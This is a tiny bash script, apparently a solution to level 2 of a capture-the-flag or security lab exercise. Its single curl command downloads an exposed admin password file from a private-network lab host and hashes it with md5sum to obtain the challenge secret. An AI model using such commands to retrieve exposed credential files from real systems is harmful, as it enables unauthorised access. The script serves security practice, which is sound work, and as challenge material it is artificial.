#! /usr/bin/env bash

# By looking at the source code, it is possible to see that the password is stored in a file. The secret can be
# obtained by hashing this password.
curl http://10.0.23.24:8002/level02/top_secret_admin_pass.txt | md5sum